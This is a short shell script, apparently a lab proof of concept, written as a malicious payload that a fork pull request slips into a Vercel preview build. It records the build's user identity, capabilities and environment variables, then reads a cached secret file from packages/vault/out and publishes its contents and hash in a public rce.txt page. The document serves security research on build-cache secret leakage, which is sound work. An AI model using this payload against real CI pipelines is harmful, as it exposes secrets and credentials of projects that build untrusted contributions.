#!/bin/sh
# Payload introduced ONLY by the fork PR. It names no artifact hash and
# makes no API call: it just reads what the build tool put on disk.
mkdir -p public
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > public/index.html
{
  echo "== fork-PR preview build =="
  id
  grep -E '^(Uid|Gid|CapEff|Seccomp):' /proc/self/status
  echo "VERCEL_ENV=${VERCEL_ENV:-unset}"
  echo "VERCEL_GIT_PULL_REQUEST_ID=${VERCEL_GIT_PULL_REQUEST_ID:-unset}"
  echo "LAB_PROD_ONLY in this build env: ${LAB_PROD_ONLY:-unset}"
  echo "TURBO_CACHE=${TURBO_CACHE:-unset} TURBO_REMOTE_ONLY=${TURBO_REMOTE_ONLY:-unset}"
  echo
  echo "== is packages/vault/out/secret.txt in git? =="
  git ls-files packages/vault | sed 's/^/  tracked: /'
  echo
  echo "== what the build tool left in packages/vault/out =="
  ls -la packages/vault/out 2>&1 | sed 's/^/  /'
  echo -n "  secret.txt -> "
  cat packages/vault/out/secret.txt 2>&1
  echo -n "  sha256 -> "
  sha256sum packages/vault/out/secret.txt 2>&1
} > public/rce.txt
sleep 2
cat public/rce.txt
